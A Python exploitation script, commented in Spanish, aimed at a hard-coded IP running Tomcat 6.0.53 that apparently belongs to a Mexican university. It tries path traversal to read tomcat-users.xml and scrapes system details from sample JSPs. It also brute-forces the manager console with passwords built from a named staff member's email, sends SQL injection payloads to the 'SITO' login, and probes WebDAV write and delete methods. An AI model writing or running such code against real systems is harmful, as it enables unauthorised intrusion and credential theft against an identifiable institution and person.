#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACIÓN MEJORADA TOMCAT 6.0.53 - EXTRACCIÓN REAL DE ARCHIVOS
"""

import requests
import re
import os
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)

class AdvancedTomcatExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        
    def extract_real_files(self):
        """Extrae archivos usando métodos alternativos"""
        print("[+] Intentando extracción real de archivos...")
        
        # Método 1: Usar diferentes parámetros de traversal
        traversal_methods = [
            "/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml",
            "/examples/jsp/include/include.jsp?file=../../../../conf/tomcat-users.xml",
            "/examples/jsp/include/include.jsp?url=file:///conf/tomcat-users.xml",
            "/examples/jsp/include/include.jsp?path=../../../../conf/tomcat-users.xml",
            "/examples/jsp/include/include.jsp?page=..\\..\\..\\..\\conf\\tomcat-users.xml",
            "/examples/jsp/cal/cal2.jsp?time=....//....//....//....//conf/tomcat-users.xml",
            "/examples/jsp/snp/snoop.jsp?param=../../../../conf/tomcat-users.xml",
        ]
        
        for method in traversal_methods:
            self.try_traversal_method(method, "tomcat-users.xml")
        
        # Método 2: Probar encoding diferentes
        encoded_paths = [
            "/examples/jsp/include/include.jsp?page=....%2f....%2f....%2f....%2fconf%2ftomcat-users.xml",
            "/examples/jsp/include/include.jsp?page=..%252f..%252f..%252f..%252fconf%252ftomcat-users.xml",
        ]
        
        for encoded in encoded_paths:
            self.try_encoded_traversal(encoded, "tomcat-users-encoded.xml")
    
    def try_traversal_method(self, path, filename):
        """Prueba un método específico de traversal"""
        url = f"http://{self.target}{path}"
        try:
            print(f"🔍 Probando: {path}")
            r = self.session.get(url, timeout=10)
            
            # Buscar patrones XML en la respuesta
            if self.search_xml_content(r.text, filename):
                return True
                
        except Exception as e:
            print(f"❌ Error: {e}")
        return False
    
    def try_encoded_traversal(self, path, filename):
        """Prueba traversal con encoding"""
        url = f"http://{self.target}{path}"
        try:
            print(f"🔐 Probando encoded: {path}")
            r = self.session.get(url, timeout=10)
            self.search_xml_content(r.text, filename)
        except Exception as e:
            print(f"❌ Error encoded: {e}")
    
    def search_xml_content(self, content, filename):
        """Busca y extrae contenido XML de la respuesta HTML"""
        # Patrones para buscar contenido XML
        xml_patterns = [
            r'<user username="[^"]*" password="[^"]*" roles="[^"]*"/>',
            r'<role rolename="[^"]*"/>',
            r'<Resource name="[^"]*"',
            r'<Connector port="[^"]*"',
            r'<Host name="[^"]*"',
        ]
        
        found_data = []
        for pattern in xml_patterns:
            matches = re.findall(pattern, content)
            if matches:
                found_data.extend(matches)
                print(f"✅ Encontrado: {pattern[:50]}...")
        
        if found_data:
            with open(f"real_{filename}", "w") as f:
                f.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
                f.write("<!-- Extracted content from traversal -->\n")
                for line in found_data:
                    f.write(line + "\n")
            print(f"💾 Datos XML extraídos: real_{filename}")
            return True
        return False
    
    def exploit_jsp_samples(self):
        """Explota JSP samples para obtener información del sistema"""
        print("\n[+] Explotando JSP samples para info del sistema...")
        
        jsp_samples = [
            "/examples/jsp/snp/snoop.jsp",
            "/examples/jsp/error/error.jsp?obj=java.lang.Runtime",
            "/examples/jsp/jsp2/el/basic-arithmetic.jsp",
        ]
        
        for sample in jsp_samples:
            url = f"http://{self.target}{sample}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"📊 {sample} - Accesible")
                    # Buscar información del sistema
                    self.extract_system_info(r.text, sample)
            except:
                continue
    
    def extract_system_info(self, content, source):
        """Extrae información del sistema de las JSP samples"""
        info_patterns = {
            'server_info': r'Server info:?[^<]*',
            'java_version': r'Java.*[Vv]ersion:?[^<]*',
            'os_info': r'OS.*[Nn]ame:?[^<]*',
            'username': r'[Uu]ser.*[Nn]ame:?[^<]*',
            'ip_address': r'[Rr]emote.*[Aa]ddress:?[^<]*',
        }
        
        for key, pattern in info_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"🔍 {source} - {key}: {matches[0][:100]}")
    
    def brute_force_with_patterns(self):
        """Fuerza bruta inteligente basada en patrones UTSLP"""
        print("\n[+] Fuerza bruta con patrones UTSLP...")
        
        # Basado en el email hnieto@utslp.edu.mx
        usernames = ['hnieto', 'admin', 'tomcat', 'manager', 'root', 'sito', 'utslp']
        passwords = [
            'utslp', 'utslp.edu.mx', 'hnieto', 'hnieto123', 'Hnieto123', 'Hnieto@123',
            'admin', 'tomcat', 'password', '123456', 'utslp2024', 'SITO2024'
        ]
        
        manager_urls = [
            "/manager/html",
            "/manager/status", 
            "/manager/jmxproxy"
        ]
        
        for manager_url in manager_urls:
            url = f"https://{self.target}{manager_url}"
            for user in usernames:
                for pwd in passwords:
                    try:
                        r = self.session.get(url, auth=(user, pwd), timeout=3)
                        if r.status_code == 200:
                            print(f"🎉 CREDENCIALES VÁLIDAS: {user}:{pwd}")
                            print(f"📍 URL: {url}")
                            return True
                    except:
                        continue
        return False
    
    def analyze_sito_application(self):
        """Análisis profundo de la aplicación SITO"""
        print("\n[+] Analizando aplicación SITO...")
        
        # Probar parámetros ocultos
        hidden_params = {
            'yAccion': ['login', 'cambiar_password', 'crear_usuario'],
            'yUsuario': ['hnieto', 'admin', 'root'],
            'yIntentos': ['0', '1', '2'],
        }
        
        login_url = f"http://{self.target}/jsp/index.jsp"
        
        # Test de inyección SQL en login
        sql_payloads = [
            "admin' OR '1'='1'--",
            "hnieto' OR 1=1--", 
            "' UNION SELECT 1,2,3--",
            "admin' AND 1=1--"
        ]
        
        for payload in sql_payloads:
            data = {
                'yAccion': 'login',
                'yUsuario': payload,
                'xUsuario': payload,
                'xContrasena': 'test',
                'yIntentos': '1'
            }
            try:
                r = self.session.post(login_url, data=data, timeout=5)
                if 'Solicita Ficha de Admisión' not in r.text:
                    print(f"🚨 Posible SQLi exitoso: {payload}")
            except:
                pass
    
    def webdav_exploitation(self):
        """Intenta explotar WebDAV si está habilitado"""
        print("\n[+] Probando WebDAV...")
        
        webdav_methods = ['PUT', 'DELETE', 'PROPFIND', 'MKCOL']
        webdav_urls = [
            f"http://{self.target}/webdav/",
            f"http://{self.target}/dav/",
            f"http://{self.target}/examples/webdav/",
        ]
        
        for url in webdav_urls:
            for method in webdav_methods:
                try:
                    r = self.session.request(method, url, timeout=5)
                    print(f"🔧 {method} {url} - Status: {r.status_code}")
                    if r.status_code in [200, 201, 207]:
                        print(f"✅ WebDAV posiblemente habilitado en {url}")
                except:
                    pass

    def run_advanced_exploitation(self):
        """Ejecuta la explotación avanzada"""
        print("="*70)
        print("EXPLOTACIÓN AVANZADA TOMCAT 6.0.53")
        print("="*70)
        
        self.extract_real_files()
        self.exploit_jsp_samples()
        self.brute_force_with_patterns()
        self.analyze_sito_application()
        self.webdav_exploitation()
        
        print("\n" + "="*70)
        print("RECOMENDACIONES INMEDIATAS:")
        print("1. Los archivos XML se están procesando como HTML")
        print("2. Intentar métodos de encoding alternativos")
        print("3. Probar LFI con wrappers: php://filter, expect://")
        print("4. Buscar archivos de backup: .bak, .old, .backup")
        print("="*70)

# Ejecutar
if __name__ == "__main__":
    target = "189.254.143.102"
    exploiter = AdvancedTomcatExploiter(target)
    exploiter.run_advanced_exploitation()